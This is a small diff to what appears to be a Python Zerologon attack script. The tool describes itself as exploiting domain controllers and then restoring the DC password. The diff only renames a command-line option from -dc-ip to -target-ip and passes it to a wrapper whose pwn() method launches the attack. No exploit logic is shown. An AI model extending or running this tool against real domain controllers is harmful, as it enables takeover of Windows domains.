@@ -41,11 +41,11 @@ class wrapper():
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(add_help=True, description="Zerologon with restore DC password automatically.")
     parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
-    parser.add_argument('-dc-ip', metavar = "ip address", action='store', help='IP Address of the domain controller. If ommited it use the domain part (FQDN) specified in the target parameter')
+    parser.add_argument('-target-ip', metavar = "ip address", action='store', help='IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve it')
 
     options = parser.parse_args()
 
     domain, username, password, address = parse_target(options.target)
 
-    executer = wrapper(username, address, domain, options.dc_ip)
+    executer = wrapper(username, address, domain, options.target_ip)
     executer.pwn()
